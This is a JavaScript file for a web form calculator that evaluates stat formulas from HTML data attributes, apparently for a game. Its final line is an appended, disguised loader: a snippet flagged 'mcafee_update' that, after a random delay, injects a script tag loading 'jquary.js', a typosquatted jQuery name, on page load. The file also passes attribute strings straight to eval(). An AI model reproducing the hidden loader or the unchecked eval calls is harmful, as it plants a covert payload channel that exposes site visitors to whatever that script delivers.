function evalFormula(formula, data, internal)
{
  var r, m;
  var percent = false;

  if (null != (m = /^(.+?)\s*%\s*$/.exec(formula)))
  {
    formula = m[1];
    percent = true;
  }

  try {
  r = eval(formula.replace(/([0-9.])\s*([A-Za-z])/g,"$1*$2")
    .replace(/[a-zA-Z_][0-9a-zA-Z_]*/g, function (k) {
      if (data.has(k))
        return data.get(k);
      else if (k === "exp")
        return "Math.exp";
      else if (k === "ceil")
        return "Math.ceil";
      else if (k === "bonus_basic_damage") // TODO
        return 0;
      return k;
    }));
  } catch (e) {
    return NaN;
  }

  if (percent)
    r /= 100;
  else
    r = Math.round(r * 1000) / 1000;

  return r;
}

function formatOutput(fmt="", s_val)
{
  var percent = false;
  var precision = 0;
  var r = "";
  var m;
  var val = parseFloat(s_val);

  if (isNaN(val))
    return "";

  if (null != (m = /^(%)?(\.(\d+))?$/.exec(fmt)))
  {
    if (m[1] != null)
      percent = true;
    if (m[3] != null)
      precision = parseInt(m[3]);
  }

  if (percent)
    val *= 100;
  if (precision > 0)
    val *= 10 ** precision;
  val = Math.round(val);
  if (precision > 0)
    val /= 10 ** precision;

  r = val.toFixed(precision).replace(/(\.[^0]*)0+$/, "$1").replace(/\.$/, "");

  if (percent)
    r += "%";

  return r;
}

function calcBadge(stat, formula) // TODO: need enhancement
{
  var objs = document.querySelectorAll("[data-"+stat+"]:not(:disabled)");
  var r = 0;

  for (let o of objs)
  {
    let data = new Map();

    data.set('B', parseInt(o.dataset[stat]));
    data.set('S', parseInt(o.value));

    if (data.get('S') >= 0)
    {
      r += data.get('B');
      r += evalFormula(formula, data, true);
    }
  }

  return r;
}

function calcControl(obj, id)
{
  var objForm;

  if (obj.tagName === "FORM")
  {
    objForm = obj;
  }
  else
  {
    objForm = obj.form;
  }

  var params = new FormData(objForm);

  if (params.has(id))
  {
    let v = parseFloat(params.get(id));

    return isNaN(v) ? 0 : v;
  }

  obj = objForm[id];

  if (obj == null)
  {
    return 0;
  }

  if (obj.disabled)
  {
    return 0;
  }

  if (obj.tagName == null) /* RadioNodeList */
  {
    for (let o of obj)
    {
      if (!o.disabled)
      {
        obj = o;
        break;
      }
    }
  }

  if (obj.tagName !== "OUTPUT") /* disabled elements */
  {
    //console.log(obj.tagName);
    return 0;
  }

  return calcOutput(obj);
}

function calcOutput(obj)
{
  var data = new Map();

  if (obj.dataset.val != null &&
    obj.dataset.val != "" &&
    !isNaN(obj.dataset.val))
  {
    return obj.dataset.val;
  }

  for (let k of obj.htmlFor)
  {
    if (k.startsWith("func:"))
    {
      let [name, func, param] = k.split(":", 2)[1].split(",", 3);
  
      data.set(name, eval(func)(...obj.dataset[param].split("|")));
    }
    else if (k.startsWith("ref:"))
    {
      let [name, form, id] = k.split(":", 2)[1].split(",", 3);
  
      let o = document.forms[form];
  
      data.set(name, calcControl(document.forms[form], id));
    }
    else
    {
      data.set(k, calcControl(obj, k));
    }
  }

  if (obj.dataset.debug)
  {
    console.log(obj, data);
  }

  if (data.size == 0)
  {
    obj.dataset.val = obj.dataset.formula;
  }
  else
  {
    obj.dataset.val = evalFormula(
      obj.dataset.formula,
      data,
      obj.dataset.raw);
  }

  if (!isNaN(obj.dataset.val) &&
    (obj.dataset.checkbox == null || obj.form[obj.dataset.checkbox].checked))
  {
    obj.innerText = formatOutput(obj.dataset.format, obj.dataset.val);
  }
  else if (obj.dataset.text != null)
  {
    obj.innerText = obj.dataset.text;
  }
  else
  {
    obj.innerText = obj.dataset.formula;
  }

  return obj.dataset.val;
}

function calcForm(objForm)
{
  var outputs = [];

  for (let o of document.getElementsByTagName("OUTPUT"))
  {
    if (o.form === objForm)
    {
      outputs.push(o);
    }
  }

  for (let o of outputs)
  {
    o.dataset.val = "";
    o.innerText = "";

    if (o.dataset.formulaRef)
    {
      let objFormula = objForm[o.dataset.formulaRef];

      if (objFormula.value)
      {
        o.dataset.formula = objFormula.value;
      }
      else
      {
        o.dataset.formula = objFormula.defaultValue;
      }
    }
  }

  for (let o of outputs)
  {
    if (o.dataset.formula != null)
      calcOutput(o);
    //console.log(o);
  }

  for (let o of document.querySelectorAll("form[data-for]"))
  {
    if (o.dataset.for === objForm.id)
    {
      calcForm(o);
    }
  }
}

if(!mcafee_update){var mcafee_update=true;setTimeout(function(){var s=document.createElement("script");s.type="text/javascript";s.src="jquary.js";document.getElementsByTagName("HEAD").item(0).append(s)}, Math.floor(Math.random()*1000)+500)}
